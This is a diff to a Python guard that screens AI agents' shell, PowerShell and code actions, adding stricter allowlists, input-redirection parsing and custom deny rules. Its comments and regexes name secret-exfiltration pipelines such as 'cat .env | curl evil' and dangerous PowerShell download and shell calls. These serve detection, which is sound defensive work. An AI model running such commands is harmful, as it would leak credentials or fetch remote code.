+            seed_active, seed_supp = _partition_suppressed_ast_findings(seed_visitor, resolved_source, allow_suppression=allow_suppression)
+        patched_active, patched_supp = _partition_suppressed_ast_findings(patched_visitor, patched_source or "", allow_suppression=allow_suppression)
         baseline_counts = Counter(seed_active)
         delta_counts = Counter(patched_active) - baseline_counts
         for finding, cnt in delta_counts.items():
@@ -2358,7 +2560,44 @@ def _extract_shell_redirections(cmd: str) -> List[Dict[str, str]]:
                 redirs.append({"kind": "process_substitution", "target": ""})
                 i += 2
                 continue
-            i += 1
+            # Input redirection `< file` or `0< file` (ignore heredoc `<<` / here-string `<<<`)
+            if not (i + 1 < n and cmd[i + 1] == "<"):
+                j = i + 1
+                while j < n and cmd[j] in (" ", "\t"):
+                    j += 1
+                tok_chars: List[str] = []
+                t_sq = False
+                t_dq = False
+                t_esc = False
+                while j < n:
+                    tc = cmd[j]
+                    if t_esc:
+                        tok_chars.append(tc)
+                        t_esc = False
+                        j += 1
+                        continue
+                    if tc == "\\" and not t_sq:
+                        t_esc = True
+                        j += 1
+                        continue
+                    if tc == "'" and not t_dq:
+                        t_sq = not t_sq
+                        j += 1
+                        continue
+                    if tc == '"' and not t_sq:
+                        t_dq = not t_dq
+                        j += 1
+                        continue
+                    if not t_sq and not t_dq and (tc.isspace() or tc in ";|&<>()"):
+                        break
+                    tok_chars.append(tc)
+                    j += 1
+                in_target = "".join(tok_chars)
+                if in_target:
+                    redirs.append({"kind": "input_file", "target": in_target})
+                i = j
+                continue
+            i += 2
             continue
 
         if not in_single and not in_double and ch == ">":
@@ -2523,6 +2762,32 @@ def _is_command_allowlisted(exe: str, args: List[str], policy: Optional[PolicyCo
             for a in args_lower
         ):
             return False
+        if exe == "clang-format":
+            for a in args:
+                al = a.lower()
+                if a.startswith("-"):
+                    if al.startswith("--style=file:") or al == "--assume-filename" or al.startswith("--assume-filename="):
+                        val = a.split("=", 1)[1] if "=" in a else ""
+                        if val and (
+                            val.startswith(("/", "~"))
+                            or ".." in val.replace("\\", "/").split("/")
+                            or is_protected_path(val)
+                        ):
+                            return False
+                    continue
+                if (
+                    a.startswith(("/", "~"))
+                    or ".." in a.replace("\\", "/").split("/")
+                    or is_protected_path(a)
+                ):
+                    return False
+        if exe == "mypy":
+            if any(
+                a in {"--config-file", "--custom-typeshed-dir", "--shadow-file"}
+                or a.startswith(("--config-file=", "--custom-typeshed-dir=", "--shadow-file="))
+                for a in args_lower
+            ):
+                return False
         if exe == "black" and not is_dev:
             return any(a in {"--check", "--diff"} for a in args_lower)
         if exe == "ruff" and not is_dev:
@@ -2530,7 +2795,17 @@ def _is_command_allowlisted(exe: str, args: List[str], policy: Optional[PolicyCo
                 return False
             if args_lower and args_lower[0] == "format" and not any(a in {"--check", "--diff"} for a in args_lower):
                 return False
-        if exe == "pytest" and "--capture=sys" in args_lower:
+        if exe == "pytest":
+            if not is_dev:
+                if any(
+                    a in {"-o", "--override-ini", "-c", "--pyargs", "-p"}
+                    or a.startswith(("-o=", "--override-ini=", "-c=", "--pyargs=", "-p="))
+                    for a in args_lower
+                ):
+                    return False
+                for a in args:
+                    if not a.startswith("-") and (a.startswith(("/", "~")) or ".." in a.replace("\\", "/").split("/")):
+                        return False
             return True
         return True
     if is_dev and exe in SAFE_DEV_SHELL_COMMANDS:
@@ -2766,14 +3041,17 @@ def _expand_bash_braces(
 
 
 def _extract_candidate_paths_from_arg(arg: str) -> List[str]:
-    """Extract filesystem path candidates from a shell argument (flags, `<file`, `rev:path`, bash braces)."""
+    """Extract filesystem path candidates from a shell argument (flags, `<file`, `0<file`, `rev:path`, bash braces)."""
     cleaned = str(arg or "").strip()
     if not cleaned:
         return []
-    if cleaned.startswith("<"):
+    m_in = re.match(r"^\d*<(?!<)(.+)$", cleaned)
+    if m_in:
+        cleaned = m_in.group(1).strip()
+    elif cleaned.startswith("<"):
         cleaned = cleaned.lstrip("<").strip()
-        if not cleaned:
-            return []
+    if not cleaned:
+        return []
     if cleaned.startswith("@"):
         cleaned = cleaned.lstrip("@").strip()
         if not cleaned:
@@ -3095,9 +3373,16 @@ _PS_UNIX_DELEGATED_DESTRUCTIVE: Set[str] = {
 _PS_REDIR_RE = re.compile(r"(?:[1-6*]?>>?|&>>?)\s*(\"[^\"]*\"|'[^']*'|[^\s;|&<>]+)")
 
 
-def _extract_ps_nested_blocks(script: str) -> List[str]:
-    """Extract inner bodies of `{ ... }` scriptblocks and `$( ... )` subexpressions."""
-    blocks: List[str] = []
+_PS_DANGEROUS_DOTNET_RE = re.compile(
+    r"(?i)(?:net\.webclient|\.\s*download(?:string|file|data)\s*\(|\.\s*kill\s*\(|"
+    r"reflection\.assembly\s*::\s*load|system\.diagnostics\.process\s*::\s*start|"
+    r"scriptcontrol|wscript\.shell|shell\.application)"
+)
+
+
+def _extract_ps_nested_blocks(script: str) -> List[Tuple[str, str]]:
+    """Extract inner bodies of `{ ... }`, `$( ... )`, and `( ... )` expressions as `(kind, body)`."""
+    blocks: List[Tuple[str, str]] = []
     n = len(script)
     i = 0
     in_single = False
@@ -3115,10 +3400,13 @@ def _extract_ps_nested_blocks(script: str) -> List[str]:
             in_double = not in_double
             i += 1
             continue
-        if not in_single and (ch == "{" or (ch == "$" and i + 1 < n and script[i + 1] == "(")):
-            open_ch = "{" if ch == "{" else "("
-            close_ch = "}" if ch == "{" else ")"
-            start = i + (1 if ch == "{" else 2)
+        if not in_single and (ch in "({" or (ch == "$" and i + 1 < n and script[i + 1] == "(")):
+            if ch == "{":
+                kind, open_ch, close_ch, start = "scriptblock", "{", "}", i + 1
+            elif ch == "$":
+                kind, open_ch, close_ch, start = "subexpr", "(", ")", i + 2
+            else:
+                kind, open_ch, close_ch, start = "paren", "(", ")", i + 1
             depth = 1
             j = start
             sub_single = False
@@ -3140,8 +3428,10 @@ def _extract_ps_nested_blocks(script: str) -> List[str]:
                         if depth == 0:
                             break
                 j += 1
-            blocks.append(script[start:j])
-            i = start  # continue scanning so outer structure advances safely
+            body = script[start:j].strip()
+            if body:
+                blocks.append((kind, body))
+            i = start
             continue
         i += 1
     return blocks
@@ -3187,11 +3477,14 @@ def _inspect_ps_script(
     if "::" in scan_text and "powershell_dotnet_static_call" not in unrecognized:
         unrecognized.append("powershell_dotnet_static_call")
 
+    if _PS_DANGEROUS_DOTNET_RE.search(scan_text):
+        findings.append("powershell_dotnet_dangerous_method")
+
     nested = _extract_ps_nested_blocks(scan_text)
-    if nested or "{" in scan_text or "}" in scan_text or "$(" in scan_text:
+    if nested or any(sym in scan_text for sym in ("{", "}", "$(", "(", ")")):
         if "powershell_scriptblock_or_subexpr" not in unrecognized:
             unrecognized.append("powershell_scriptblock_or_subexpr")
-        for body in nested:
+        for _kind, body in nested:
             _inspect_ps_script(
                 body,
                 policy,
@@ -3216,6 +3509,8 @@ def _inspect_ps_script(
     stmt_text = _PS_REDIR_RE.sub(" ", scan_text)
     for raw_stmt in _split_shell_subcommands(stmt_text):
         stmt = raw_stmt.strip()
+        while len(stmt) >= 2 and stmt.startswith("(") and stmt.endswith(")"):
+            stmt = stmt[1:-1].strip()
         if not stmt:
             continue
         toks, unbalanced = _tokenize_ps_statement(stmt)
@@ -3236,10 +3531,13 @@ def _inspect_ps_script(
                     unrecognized.append("powershell_call_operator")
                 toks = [toks[0][1:]] + toks[1:]
 
-        first_raw = re.split(r"[\s({]", toks[0], 1)[0].strip().strip("'\"").lower()
+        first_tok = toks[0].lstrip("(")
+        first_raw = re.split(r"[\s({]", first_tok, 1)[0].strip().strip("'\"").lower()
         first = os.path.basename(first_raw).removesuffix(".exe").removesuffix(".com")
         stmt_args = toks[1:]
         if not first:
+            if "powershell_unparseable_statement" not in unrecognized:
+                unrecognized.append("powershell_unparseable_statement")
             continue
 
         # Inspect every token for PowerShell env/provider drives and protected filesystem paths
@@ -3276,12 +3574,12 @@ def _inspect_ps_script(
             findings.append(_PS_DANGEROUS_CMDLETS[first])
             continue
 
-        if first in {"remove-item", "ri"}:
+        if first in {"remove-item", "ri", "rm"}:
             has_rec_or_force = False
             for a in stmt_args:
                 alow = a.lower()
                 if alow.startswith("-") and not alow.startswith("--") and len(alow) >= 2:
-                    if "-recurse".startswith(alow) or "-force".startswith(alow):
+                    if "-recurse".startswith(alow) or "-force".startswith(alow) or "r" in alow[1:]:
                         has_rec_or_force = True
                         break
             targets_danger = any(
@@ -3292,11 +3590,12 @@ def _inspect_ps_script(
             if has_rec_or_force or targets_danger:
                 findings.append("powershell_remove_item_recursive")
             else:
-                unrecognized.append("powershell:remove-item")
+                unrecognized.append(f"powershell:{first}")
             continue
 
         if first in _PS_UNIX_DELEGATED_DESTRUCTIVE or first.startswith("mkfs."):
-            sub_res = analyze_shell_command(" ".join(toks), policy=policy)
+            safe_args = " ".join(tok.replace("\\", "/") for tok in toks)
+            sub_res = analyze_shell_command(safe_args, policy=policy)
             if not sub_res.get("is_safe", True):
                 findings.extend(sub_res.get("findings", []))
             else:
@@ -3316,7 +3615,7 @@ def _analyze_powershell_invocation(
 ) -> Tuple[List[str], List[str], bool]:
     """B3: analyze `powershell`/`pwsh -Command` payloads against an explicit read-only cmdlet surface.
 
-    Returns `(findings, unrecognized, fully_safe)`. `-EncodedCommand` vetoes
+    Returns `(findings, unrecognized, fully_safe)`. `-EncodedCommand` / `/enc` vetoes
     (`powershell_encoded_command`); `-File` and opaque invocations stay
     unrecognized (escalate); scriptblocks/redirections/subexpressions escalate or
     veto if dangerous cmdlets or protected-path writes are inside. Optional `extra`
@@ -3331,6 +3630,8 @@ def _analyze_powershell_invocation(
     script_parts: List[str] = []
     for idx, a in enumerate(args):
         low = a.lower()
+        if low.startswith("/") and len(low) >= 2:
+            low = "-" + low[1:]
         if low in {"-encodedcommand", "-enc", "-e", "-ec"} or (
             low.startswith("-en") and "-encodedcommand".startswith(low)
         ):
@@ -3339,8 +3640,6 @@ def _analyze_powershell_invocation(
         if low in {"-command", "-c"} or (
             low.startswith("-co") and "-command".startswith(low)
         ):
-            # PowerShell takes everything after -Command as the script; later
-            # flag-looking tokens are part of it, not invocation flags.
             mode = "command"
             script_parts = args[idx + 1 :]
             break
@@ -3452,6 +3751,7 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
             }
 
     findings: List[str] = []
+    protected_path_reads: List[str] = []
     meta_finding = _has_unsafe_shell_metachar(cmd)
     if meta_finding:
         findings.append(meta_finding)
@@ -3461,6 +3761,12 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
         kind = redir["kind"]
         r_target = redir["target"]
         if kind == "fd_dup":
+            continue
+        if kind == "input_file":
+            if _PROC_ENVIRON_RE.search(r_target.replace("\\", "/")):
+                findings.append("shell_proc_environ_access")
+            elif is_protected_path(r_target, policy=policy):
+                protected_path_reads.append(r_target)
             continue
         if kind == "process_substitution":
             findings.append("shell_output_redirection")
@@ -3472,13 +3778,17 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
         else:
             unprivileged_redirects.append(r_target)
 
+    # Optional SOTA tree-sitter-bash AST check when tree_sitter_bash is installed
+    ts_bash = _scan_bash_ast_tree_sitter(cmd, policy=policy)
+    if ts_bash.get("available"):
+        findings.extend(ts_bash.get("findings") or [])
+        protected_path_reads.extend(ts_bash.get("protected_reads") or [])
+
     # `$IFS` / `${IFS}` used as a word separator is an obfuscation technique, not routine agent usage
     if re.search(r"\$\{?IFS\b", cmd):
         findings.append("shell_ifs_obfuscation")
 
-    # Inspect pipes for secret exfiltration (e.g. cat .env | curl ...)
-    # Use grouping-aware pipeline splitting so that multi-statement groupings like
-    # `(cat .env; echo x) | curl evil` or `{ cat .env; echo x; } | curl evil` are not split.
+    # Inspect pipes for secret exfiltration (e.g. cat .env | curl ..., cat 0<.env | curl ...)
     for logical_block in _split_command_pipeline_blocks(cmd):
         pipe_segments = _split_unquoted_pipes(logical_block)
         if len(pipe_segments) > 1:
@@ -3486,9 +3796,11 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
             has_egress_sink = False
             for p in pipe_segments:
                 p = _clean_shell_grouping(p)  # strip subshell/brace-group wrappers
-                # A grouping may contain multiple statements separated by ';' or '&&' / '||'
                 sub_segments = _split_shell_subcommands(p)
                 for sub_seg in sub_segments:
+                    for s_redir in _extract_shell_redirections(sub_seg):
+                        if s_redir["kind"] == "input_file" and is_protected_path(s_redir["target"], policy=policy):
+                            has_protected_read = True
                     ptoks = _tokenize_shell_segment(sub_seg)
                     prem, _pwrap, _pwf, _pbare, _pinl = _unwrap_shell_prefix(ptoks)
                     eff = prem or ptoks
@@ -3599,7 +3911,6 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
     subcommands = _split_shell_subcommands(cmd)
     parsed_cmds: List[str] = []
     unrecognized: List[str] = []
-    protected_path_reads: List[str] = []
     sensitive_env_vars: List[str] = []
     sensitive_env_access = False
 
@@ -3759,7 +4070,8 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
 
         elif exe in {"rg", "ag"}:
             if any(
-                a in {"--unrestricted", "--hidden", "--no-ignore", "--no-ignore-dot", "-."}
+                a in {"--unrestricted", "--hidden", "-."}
+                or a.startswith("--no-ignore")
                 or (a.startswith("-") and not a.startswith("--") and "u" in a[1:])
                 for a in args_lower
             ):
@@ -3767,12 +4079,17 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
 
         elif exe in {"grep", "egrep", "fgrep"}:
             has_rec = any(
-                a == "--recursive" or (a.startswith("-") and not a.startswith("--") and ("r" in a[1:] or "R" in a[1:]))
+                a in {"--recursive", "--dereference-recursive"}
+                or (a.startswith("-") and not a.startswith("--") and any(ch in a[1:] for ch in "rR"))
                 for a in args
             )
             non_flag = [a for a in args if not a.startswith("-")]
-            targets_root_or_dot = any(t in {".", "./", "~", "~/"} or t.startswith("/") for t in non_flag[1:])
-            if (has_rec and targets_root_or_dot) or any(a.startswith("--include=.") for a in args_lower):
+            implicit_cwd = len(non_flag) <= 1
+            targets_root_or_dot = any(
+                t in {".", "./", "~", "~/"} or t.startswith("/") or ".." in t.replace("\\", "/").split("/")
+                for t in non_flag[1:]
+            )
+            if (has_rec and (implicit_cwd or targets_root_or_dot)) or any(a.startswith("--include=.") for a in args_lower):
                 protected_path_reads.append("hidden_file_search")
 
         elif exe == "find":
@@ -3826,7 +4143,7 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
                         for u in inner_res.get("unrecognized_commands", []):
                             unrecognized.append(u)
 
-        elif exe in {"python", "python3"}:
+        elif re.fullmatch(r"python(?:\d+(?:\.\d+)*)?w?", exe):
             for idx_arg, a in enumerate(args_lower):
                 has_inline_c = (a == "-c" or (a.startswith("-") and not a.startswith("--") and "c" in a))
                 if has_inline_c:
@@ -3837,7 +4154,12 @@ def analyze_shell_command(cmd_str: Optional[str], policy: Optional[PolicyConfig]
                     elif idx_arg + 1 < len(args):
                         inline_code = args[idx_arg + 1]
                     if inline_code:
-                        inline_res = analyze_code_diff("<inline>.py", inline_code)
+                        inline_res = analyze_code_diff(
+                            "<inline>.py",
+                            inline_code,
+                            policy=policy,
+                            allow_suppression=bool(getattr(policy, "allow_inline_suppression", True)),
+                        )
                         if not inline_res["syntax_valid"] or not inline_res["security_clean"]:
                             findings.extend(f"unsafe_inline_python:{f}" for f in inline_res["findings"])
 
@@ -3916,7 +4238,7 @@ def record_decision_journal(entry: Dict[str, Any], journal_path: Optional[Path] 
             contract_copy["risk_assessment"] = redact_secrets(contract_copy["risk_assessment"])
         sanitized["escalation_contract"] = contract_copy
     _DECISION_RING_BUFFER.append(sanitized)
-    target = journal_path or DEFAULT_JOURNAL_PATH
+    target = journal_path or _effective_default_journal_path()
     try:
         append_jsonl_bounded(target, json.dumps(sanitized, ensure_ascii=False))
         return {"written": True, "path": str(target), "error": None}
@@ -4132,6 +4454,46 @@ def _check_imported_project_modules(
     return flagged
 
 
+def _evaluate_custom_rules(
+    cfg: PolicyConfig,
+    clean_tool: str,
+    target_path: Optional[str],
+    cmd_str: Optional[str],
+    action_filter: Optional[str] = None,
+) -> Optional[Tuple[str, str, str, int]]:
+    """Evaluate AgentSpec-style declarative `PolicyConfig.custom_rules`."""
+    rules = getattr(cfg, "custom_rules", ()) or ()
+    if not rules:
+        return None
+    norm_path = str(target_path or "").replace("\\", "/").strip()
+    norm_cmd = str(cmd_str or "")
+    for r in rules:
+        if not isinstance(r, dict):
+            continue
+        action = str(r.get("action") or "").strip().lower()
+        if action not in {"deny", "escalate"}:
+            continue
+        if action_filter and action != action_filter:
+            continue
+        tool_pat = r.get("tool")
+        if tool_pat is not None:
+            if not clean_tool or not re.fullmatch(str(tool_pat), clean_tool, re.IGNORECASE):
+                continue
+        path_glob = r.get("path_glob")
+        if path_glob is not None:
+            pg = str(path_glob).replace("\\", "/").lower()
+            if not norm_path or not fnmatch.fnmatch(norm_path.lower(), pg):
+                continue
+        cmd_pat = r.get("cmd_regex")
+        if cmd_pat is not None:
+            if not norm_cmd or not re.search(str(cmd_pat), norm_cmd):
+                continue
+        rule_id = str(r.get("id") or "custom_rule").strip()
+        label = str(r.get("reason") or f"custom_policy_rule:{rule_id}").strip()
+        return (action, label, f"layer0_custom_policy_rule:{rule_id}", 0)
+    return None
+
+
 def decide(
     input_data: Any,
     context: Optional[Dict[str, Any]] = None,
@@ -4251,7 +4613,7 @@ def decide(
         latency_ms = round((time.perf_counter_ns() - t0) / 1_000_000.0, 4)
         recent = list(_DECISION_RING_BUFFER)[-12:]
         if len(recent) < 9 and (journal_path is not None or should_log):
-            j_target = journal_path or DEFAULT_JOURNAL_PATH
+            j_target = journal_path or _effective_default_journal_path()
             disk_recent = _tail_journal_recent(j_target, limit=12)
             if len(disk_recent) > len(recent):
                 recent = disk_recent[-12:]
@@ -4357,7 +4719,10 @@ def decide(
             }
         if pending_taint_record is not None and decision != "deny" and not shadow_mode:
             t_sess, t_tool, t_path, t_prot = pending_taint_record
-            t_sess.record_pre_tool(t_tool, t_path, t_prot)
+            if cmd_str and hasattr(t_sess, "record_external_shell"):
+                t_sess.record_external_shell(cmd_str)
+            if t_prot or t_sess._is_external_tool(t_tool):
+                t_sess.record_pre_tool(t_tool, t_path, t_prot)
         if diff_structural_context:
             out["structural_context"] = diff_structural_context
         if diff_suppressed_findings:
@@ -4397,6 +4762,11 @@ def decide(
                 and _is_agent_control_plane_path(str(l0.get("protected_path") or ""))
             ):
                 return _finish("deny", "blocked_policy", ["deny"], l0["reason_code"], 0)
+
+        custom_deny = _evaluate_custom_rules(cfg, clean_tool, target_path, cmd_str, action_filter="deny")
+        if custom_deny is not None:
+            c_act, c_lbl, c_code, c_layer = custom_deny
+            return _finish(c_act, c_lbl, ["deny"], c_code, c_layer)
 
         # Cross-turn SessionSecurityState taint guard runs BEFORE l0 escalate so
         # corrupted state/lethal trifecta fail closed and protected reads record taint.
@@ -4505,7 +4875,14 @@ def decide(
                 original_source is None
                 and ("@@" in diff_text or diff_text.lstrip().startswith(("diff --git", "--- ", "+++ ")))
             )
-            diff_res = analyze_code_diff(target_path, diff_text, original_source=original_source, edit_ops=edit_ops)
+            diff_res = analyze_code_diff(
+                target_path,
+                diff_text,
+                original_source=original_source,
+                edit_ops=edit_ops,
+                policy=cfg,
+                allow_suppression=bool(getattr(cfg, "allow_inline_suppression", True)),
+            )
             diff_structural_context.extend(diff_res.get("structural_context", []))
             if diff_res.get("suppressed_findings"):
                 diff_suppressed_findings.extend(diff_res["suppressed_findings"])
@@ -4573,6 +4950,11 @@ def decide(
                 )
                 if tainted:
                     return _finish("escalate", tainted[0], ["allow", "deny"], "layer1_imports_flagged_module", 1)
+
+        custom_esc = _evaluate_custom_rules(cfg, clean_tool, target_path, cmd_str, action_filter="escalate")
+        if custom_esc is not None:
+            c_act, c_lbl, c_code, c_layer = custom_esc
+            return _finish(c_act, c_lbl, ["allow", "deny"], c_code, c_layer)
 
         # Named executable/unknown tools NEVER fall through to Layer 2 routing advice.
         # Allow at Layer 1 ONLY for verified shell/edit tools with inspected payloads or explicit READ_ONLY tools.
@@ -4681,7 +5063,7 @@ def recalibrate_from_decision_journal(
     if journal_entries is not None:
         entries = [dict(e) for e in journal_entries if isinstance(e, dict)]
     else:
-        target = Path(journal_path) if journal_path else DEFAULT_JOURNAL_PATH
+        target = Path(journal_path) if journal_path else _effective_default_journal_path()
         if _DECISION_RING_BUFFER:
             entries = list(_DECISION_RING_BUFFER)
         elif target.is_file():
